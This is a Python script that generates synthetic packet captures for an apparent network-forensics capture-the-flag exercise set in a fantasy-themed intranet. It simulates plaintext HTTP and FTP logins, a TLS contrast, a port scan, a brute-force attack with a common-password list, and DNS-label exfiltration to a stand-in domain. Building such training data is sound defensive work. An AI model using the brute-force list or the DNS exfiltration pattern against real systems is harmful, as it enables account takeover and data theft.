import sys, os, random, binascii
sys.path.insert(0, os.path.dirname(__file__))
from flowlib import *
OUT = sys.argv[1]
WKS, SRV, DC, BAD, GW = "10.10.10.20", "10.10.10.30", "10.10.10.10", "10.10.10.66", "10.10.10.1"

def http_req(method, path, host, extra="", body=""):
    h = f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/131.0\r\nAccept: text/html,*/*;q=0.8\r\n{extra}"
    if body: h += f"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\n"
    return (h + "\r\n" + body).encode()
def http_resp(status, body, extra=""):
    b = body.encode()
    return (f"HTTP/1.1 {status}\r\nServer: Werkzeug/3.0.4 Python/3.12.3\r\nDate: Sat, 03 Oct 2026 14:02:11 GMT\r\n"
            f"Content-Type: text/html; charset=utf-8\r\n{extra}Content-Length: {len(b)}\r\nConnection: close\r\n\r\n").encode() + b

LOGIN_PAGE = """<!doctype html><html><head><title>Wizard Tower Intranet</title></head><body>
<h1>Wizard Tower Intranet</h1><p>Authorized adventurers only.</p>
<form method="POST" action="/login"><input name="username"><input name="password" type="password"><button>Enter</button></form>
<!-- TODO: remove legacy HTTP login before the Vaultkeeper finds out -->
</body></html>"""
DASH = """<!doctype html><html><head><title>Dashboard</title></head><body><h1>Welcome back, {u}</h1>
<ul><li>Quest board</li><li>Vault inventory</li><li><a href="/files">Shared files (FTP)</a></li></ul></body></html>"""

# ---------------------------------------------------------------- 01 warmup
def warmup():
    c = Capture(1790000000.0)
    arp_pair(c, WKS, GW)
    dns_query(c, WKS, DC, "watchtower.gielinor.local", "A", SRV, dt=1.2)
    ping(c, WKS, SRV, 4, dt=0.5)
    dns_query(c, WKS, DC, "www.professormesser.com", "A", "104.21.34.88", dt=2.0)
    dns_query(c, WKS, DC, "www.professormesser.com", "AAAA", None, dt=0.1)
    dns_query(c, WKS, DC, "tryhackme.com", "A", "172.67.27.10", dt=3.0)
    dns_query(c, WKS, DC, "wizard-tower-backup.gielinor.local", "A", None, rcode=3, dt=2.5)  # NXDOMAIN
    dns_query(c, WKS, DC, "30.10.10.10.in-addr.arpa", "PTR", "watchtower.gielinor.local.", dt=2.0)
    f = TCPFlow(c, WKS, SRV, 80); c.clk.wait(1.0); f.handshake()
    f.send(True, http_req("GET", "/", "watchtower.gielinor.local")); f.send(False, http_resp("200 OK", LOGIN_PAGE)); f.close()
    c.save(f"{OUT}/01-warmup.pcap")

# ---------------------------------------------------------------- 02 http login
def http_login():
    c = Capture(1790001000.0)
    dns_query(c, WKS, DC, "watchtower.gielinor.local", "A", SRV)
    f = TCPFlow(c, WKS, SRV, 80); c.clk.wait(0.2); f.handshake()
    f.send(True, http_req("GET", "/login", "watchtower.gielinor.local")); f.send(False, http_resp("200 OK", LOGIN_PAGE))
    c.clk.wait(6.5)
    body = "username=Navi&password=Hey-Listen%212026"
    f.send(True, http_req("POST", "/login", "watchtower.gielinor.local", "Referer: http://watchtower.gielinor.local/login\r\n", body))
    f.send(False, http_resp("302 FOUND", "", "Location: /dashboard\r\nSet-Cookie: session=eyJ1c2VyIjoiTmF2aSJ9.ZxQ1Yg.k3M9zPqVwL2sT7aBn5cD8eF0gHo; HttpOnly; Path=/\r\n"))
    f.close()
    g = TCPFlow(c, WKS, SRV, 80); c.clk.wait(0.05); g.handshake()
    g.send(True, http_req("GET", "/dashboard", "watchtower.gielinor.local", "Cookie: session=eyJ1c2VyIjoiTmF2aSJ9.ZxQ1Yg.k3M9zPqVwL2sT7aBn5cD8eF0gHo\r\n"))
    g.send(False, http_resp("200 OK", DASH.format(u="Navi")))
    g.send(True, http_req("GET", "/favicon.ico", "watchtower.gielinor.local", "Cookie: session=eyJ1c2VyIjoiTmF2aSJ9.ZxQ1Yg.k3M9zPqVwL2sT7aBn5cD8eF0gHo\r\n"))
    g.send(False, http_resp("404 NOT FOUND", "Not Found")); g.close()
    c.save(f"{OUT}/02-http-login.pcap")

# ---------------------------------------------------------------- FTP helper
VAULT_NOTES = ("Vaultkeeper's notes -- DO NOT SHARE\r\nThe portal admin account reuses the FTP password.\r\n"
               "Backup rotation: Fridays at 02:00.\r\nFORGE{plaintext_is_a_postcard}\r\n")
CSV = "id,adventurer,rank,stipend\r\n" + "\r\n".join(f"{i},{n},{r},{s}" for i,(n,r,s) in enumerate(
    [("Navi","Fairy","4200"),("Zelda_Warden","Warden","9100"),("General_Graardor","General","8800"),
     ("Princess_Irulan","Royal","12000"),("Bandit","Scout","3100"),("Kerbe","Hound","3700"),("DAME","Overseer","10400")], 1)) + "\r\n"
def ftp_session(c, client, user, pw, retr=None, retr_data=b"", cport=None, dt=0.0):
    ctl = TCPFlow(c, client, SRV, 21, cport); c.clk.wait(dt); ctl.handshake()
    ctl.send(False, "220 (vsFTPd 3.0.5)\r\n")
    ctl.send(True, f"USER {user}\r\n"); ctl.send(False, "331 Please specify the password.\r\n")
    ctl.send(True, f"PASS {pw}\r\n")
    return ctl
def ftp_full(c, client, user, pw, success=True, retr=None, retr_data=b"", dt=0.0):
    ctl = ftp_session(c, client, user, pw, dt=dt)
    if not success:
        ctl.send(False, "530 Login incorrect.\r\n"); ctl.send(True, "QUIT\r\n"); ctl.send(False, "221 Goodbye.\r\n"); ctl.close(); return
    ctl.send(False, "230 Login successful.\r\n")
    ctl.send(True, "SYST\r\n"); ctl.send(False, "215 UNIX Type: L8\r\n")
    ctl.send(True, "PWD\r\n"); ctl.send(False, '257 "/home/vaultkeeper" is the current directory\r\n')
    pasv_port = random.randint(40000, 40100); p1, p2 = pasv_port >> 8, pasv_port & 255
    ctl.send(True, "PASV\r\n"); ctl.send(False, f"227 Entering Passive Mode (10,10,10,30,{p1},{p2}).\r\n")
    ctl.send(True, "LIST\r\n")
    d = TCPFlow(c, client, SRV, pasv_port); d.handshake()
    ctl.send(False, "150 Here comes the directory listing.\r\n")
    d.send(False, f"-rw-r--r--    1 1001     1001          {len(VAULT_NOTES)} Sep 28 02:00 vault-notes.txt\r\n-rw-r--r--    1 1001     1001          {len(CSV)} Sep 28 02:00 payroll-vault.csv\r\n"); d.close(False)
    ctl.send(False, "226 Directory send OK.\r\n")
    if retr:
        pasv_port = random.randint(40101, 40200); p1, p2 = pasv_port >> 8, pasv_port & 255
        ctl.send(True, "TYPE I\r\n"); ctl.send(False, "200 Switching to Binary mode.\r\n")
        ctl.send(True, "PASV\r\n"); ctl.send(False, f"227 Entering Passive Mode (10,10,10,30,{p1},{p2}).\r\n")
        ctl.send(True, f"RETR {retr}\r\n")
        d = TCPFlow(c, client, SRV, pasv_port); d.handshake()
        ctl.send(False, f"150 Opening BINARY mode data connection for {retr} ({len(retr_data)} bytes).\r\n")
        d.send(False, retr_data); d.close(False)
        ctl.send(False, "226 Transfer complete.\r\n")
    ctl.send(True, "QUIT\r\n"); ctl.send(False, "221 Goodbye.\r\n"); ctl.close()

def ftp_pcap():
    c = Capture(1790002000.0)
    ftp_full(c, WKS, "vaultkeeper", "Ph0enix-Ash#42", True, "vault-notes.txt", VAULT_NOTES.encode(), dt=0.1)
    c.save(f"{OUT}/03-ftp-session.pcap")

# ---------------------------------------------------------------- 04 TLS
def tls_hello(sni):
    rnd = bytes(random.getrandbits(8) for _ in range(32)); sid = bytes(random.getrandbits(8) for _ in range(32))
    ciphers = bytes.fromhex("130113021303c02bc02fc02cc030cca9cca8c013c014009c009d002f0035")
    sn = sni.encode()
    ext_sni = b"\x00\x00" + (len(sn)+5).to_bytes(2,'big') + (len(sn)+3).to_bytes(2,'big') + b"\x00" + len(sn).to_bytes(2,'big') + sn
    ext_groups = bytes.fromhex("000a00080006001d00170018")
    ext_ecpf = bytes.fromhex("000b00020100")
    ext_sigs = bytes.fromhex("000d00140012040308040401050308050501080606010201")
    ext_ver = bytes.fromhex("002b0005040304 0303".replace(" ",""))
    ext_alpn = bytes.fromhex("0010000e000c02683208687474702f312e31")
    exts = ext_sni + ext_groups + ext_ecpf + ext_sigs + ext_ver + ext_alpn
    body = b"\x03\x03" + rnd + bytes([32]) + sid + len(ciphers).to_bytes(2,'big') + ciphers + b"\x01\x00" + len(exts).to_bytes(2,'big') + exts
    hs = b"\x01" + len(body).to_bytes(3,'big') + body
    return b"\x16\x03\x01" + len(hs).to_bytes(2,'big') + hs, sid
def tls_server(sid):
    rnd = bytes(random.getrandbits(8) for _ in range(32))
    body = b"\x03\x03" + rnd + bytes([32]) + sid + b"\x13\x01\x00" + bytes.fromhex("002e002b0002030400330024001d0020") + bytes(random.getrandbits(8) for _ in range(32))
    hs = b"\x02" + len(body).to_bytes(3,'big') + body
    sh = b"\x16\x03\x03" + len(hs).to_bytes(2,'big') + hs
    ccs = b"\x14\x03\x03\x00\x01\x01"
    enc = lambda n: b"\x17\x03\x03" + n.to_bytes(2,'big') + bytes(random.getrandbits(8) for _ in range(n))
    return sh + ccs + enc(2400)
def tls_pcap():
    c = Capture(1790003000.0)
    dns_query(c, WKS, DC, "watchtower.gielinor.local", "A", SRV)
    f = TCPFlow(c, WKS, SRV, 443); c.clk.wait(0.1); f.handshake()
    ch, sid = tls_hello("watchtower.gielinor.local")
    f.send(True, ch); f.send(False, tls_server(sid))
    enc = lambda n: b"\x17\x03\x03" + n.to_bytes(2,'big') + bytes(random.getrandbits(8) for _ in range(n))
    f.send(True, b"\x14\x03\x03\x00\x01\x01" + enc(53)); f.send(True, enc(412), gap=0.05)  # login POST (encrypted)
    f.send(False, enc(620)); f.send(True, enc(380)); f.send(False, enc(3100)); f.close()
    dns_query(c, WKS, DC, "www.professormesser.com", "A", "104.21.34.88", dt=1.0)
    g = TCPFlow(c, WKS, "104.21.34.88", 443); g.handshake()
    ch, sid = tls_hello("www.professormesser.com"); g.send(True, ch); g.send(False, tls_server(sid))
    g.send(True, enc(300)); g.send(False, enc(5200)); g.close()
    c.save(f"{OUT}/04-tls-contrast.pcap")

# ---------------------------------------------------------------- 05 scan
OPEN = {21, 22, 80, 443}
def scan(c, start_ports, attacker=BAD, dt=0.0, order=None):
    c.clk.wait(dt)
    ports = list(order or start_ports)
    for p in ports:
        sport = 54321
        syn = Ether(src=mac(attacker), dst=mac(SRV)) / IP(src=attacker, dst=SRV, ttl=49, id=random.randint(1,65535)) / TCP(sport=sport, dport=p, flags='S', seq=random.randint(1,2**31), window=1024, options=[('MSS',1460)])
        c.add(syn, 0.0006)
        if p in OPEN:
            c.add(Ether(src=mac(SRV), dst=mac(attacker)) / IP(src=SRV, dst=attacker, ttl=64) / TCP(sport=p, dport=sport, flags='SA', seq=random.randint(1,2**31), ack=syn[TCP].seq+1, window=64240, options=[('MSS',1460)]), 0.0003)
            c.add(Ether(src=mac(attacker), dst=mac(SRV)) / IP(src=attacker, dst=SRV, ttl=49) / TCP(sport=sport, dport=p, flags='R', seq=syn[TCP].seq+1, window=0), 0.0002)
        else:
            c.add(Ether(src=mac(SRV), dst=mac(attacker)) / IP(src=SRV, dst=attacker, ttl=64) / TCP(sport=sport, dport=p, flags='RA', seq=0, ack=syn[TCP].seq+1, window=0), 0.0003)
def scan_pcap():
    c = Capture(1790004000.0)
    # a little normal traffic first so the scan has to be *found*
    dns_query(c, WKS, DC, "watchtower.gielinor.local", "A", SRV)
    f = TCPFlow(c, WKS, SRV, 80); c.clk.wait(0.4); f.handshake()
    f.send(True, http_req("GET", "/", "watchtower.gielinor.local")); f.send(False, http_resp("200 OK", LOGIN_PAGE)); f.close()
    arp_pair(c, BAD, SRV, dt=2.0)
    ports = list(range(1, 1025)); random.shuffle(ports)
    scan(c, ports, dt=0.3)
    c.save(f"{OUT}/05-scan.pcap")

# ---------------------------------------------------------------- 06 incident
GUESSES = ["password","123456","letmein","Spring2026!","Winter2026!","Welcome1","qwerty","dragon","Zelda2026","hyrule","triforce","Master#1","P@ssw0rd","Gielinor1","changeme","Summer2026!","ocarina","Navi123","Link2026!","Triforce#2026"]
def incident_pcap():
    c = Capture(1790010000.0)
    # background noise from a legitimate user
    dns_query(c, WKS, DC, "watchtower.gielinor.local", "A", SRV)
    f = TCPFlow(c, WKS, SRV, 80); c.clk.wait(0.3); f.handshake()
    f.send(True, http_req("GET", "/", "watchtower.gielinor.local")); f.send(False, http_resp("200 OK", LOGIN_PAGE)); f.close()
    # phase 1: recon
    arp_pair(c, BAD, SRV, dt=40.0)
    scan(c, None, order=[21,22,23,25,53,80,110,135,139,443,445,3306,3389,8080], dt=0.2)
    # phase 2: brute force against Zelda_Warden
    c.clk.wait(25.0)
    for pw in GUESSES:
        fl = TCPFlow(c, BAD, SRV, 80); fl.handshake()
        body = f"username=Zelda_Warden&password={pw.replace('#','%23').replace('!','%21').replace('@','%40')}"
        ua = "python-requests/2.31.0"
        req = (f"POST /login HTTP/1.1\r\nHost: watchtower.gielinor.local\r\nUser-Agent: {ua}\r\nAccept: */*\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\n\r\n{body}").encode()
        fl.send(True, req)
        if pw == "Triforce#2026":
            fl.send(False, http_resp("302 FOUND", "", "Location: /dashboard\r\nSet-Cookie: session=eyJ1c2VyIjoiWmVsZGFfV2FyZGVuIn0.ZxQ4Aw.Zk8Pq1LmXc7TnRv2YbH5dJw0sGg; HttpOnly; Path=/\r\n"))
            fl.close()
            g = TCPFlow(c, BAD, SRV, 80); g.handshake()
            ck = "Cookie: session=eyJ1c2VyIjoiWmVsZGFfV2FyZGVuIn0.ZxQ4Aw.Zk8Pq1LmXc7TnRv2YbH5dJw0sGg\r\n"
            g.send(True, (f"GET /dashboard HTTP/1.1\r\nHost: watchtower.gielinor.local\r\nUser-Agent: {ua}\r\n{ck}\r\n"))
            g.send(False, http_resp("200 OK", DASH.format(u="Zelda_Warden")))
            g.send(True, (f"GET /files HTTP/1.1\r\nHost: watchtower.gielinor.local\r\nUser-Agent: {ua}\r\n{ck}\r\n"))
            g.send(False, http_resp("200 OK", "<h1>Shared files</h1><p>FTP host: watchtower.gielinor.local &mdash; account: vaultkeeper (password in vault-notes.txt, ask Navi)</p>"))
            g.close()
        else:
            fl.send(False, http_resp("401 UNAUTHORIZED", "<p>Invalid credentials</p>")); fl.close()
        c.clk.wait(0.6)
    # phase 3: FTP with the vaultkeeper account (guesses first, then the real one)
    c.clk.wait(14.0)
    ftp_full(c, BAD, "vaultkeeper", "vaultkeeper", False)
    ftp_full(c, BAD, "vaultkeeper", "Ph0enix-Ash#41", False)
    ftp_full(c, BAD, "vaultkeeper", "Ph0enix-Ash#42", True, "payroll-vault.csv", CSV.encode())
    # phase 4: DNS beacon from the server (hex-encoded data in TXT query labels)
    secret = b"FORGE{beacon_every_30_seconds}"
    hexs = binascii.hexlify(secret).decode()
    chunks = [hexs[i:i+20] for i in range(0, len(hexs), 20)]
    c.clk.wait(30.0)
    for i in range(10):
        label = chunks[i] if i < len(chunks) else "00"
        dns_query(c, SRV, DC, f"{i:02d}.{label}.cdn-sync.forge-updates.example", "TXT", None, rcode=3, dt=30.0 if i else 0.0)
    ping(c, SRV, BAD, 2, dt=5.0)
    c.save(f"{OUT}/06-incident.pcap")

os.makedirs(OUT, exist_ok=True)
warmup(); http_login(); ftp_pcap(); tls_pcap(); scan_pcap(); incident_pcap()
print("pcaps written")
